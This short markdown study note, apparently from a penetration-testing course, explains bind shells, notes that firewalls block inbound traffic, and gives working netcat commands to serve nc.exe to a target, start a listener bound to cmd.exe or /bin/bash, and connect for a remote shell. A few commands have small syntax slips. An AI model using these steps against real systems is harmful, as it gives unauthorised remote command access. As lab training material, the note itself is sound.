## Bind shell
* A type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target.
* A netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to it.

* **Why reverse shell is bettter than bind shell**
  * The in-bound traffic on most of the OSs is blocked by the firewall, so if firewall is enabled bind shell is most likely to fail
 
* PRACTICAL
* cd to the folder where nc.exe is located
* `cd /usr/share/windows-binaries`
* `python -m SimpleHTTPServer 80`
* On the target it download nc.exe using the web browser or certutil utility
* On the attacker, turn the server off
* On the target, turn the listener ON:
  * `nc -nvlp 1234 -e cmd.exe`
 
* On the attacker
  * nc -nv [Target IP] 1234`
  * Command shell should be provided
 
* IF the attacker is Windows and the target is Linux
* On Linux, start a listener
  * `nc -nvlp -c /bin/bash
 
* On Windows
  * `nc.exe -nv [Linux IP] 1234`
  * Bash shell should be provided
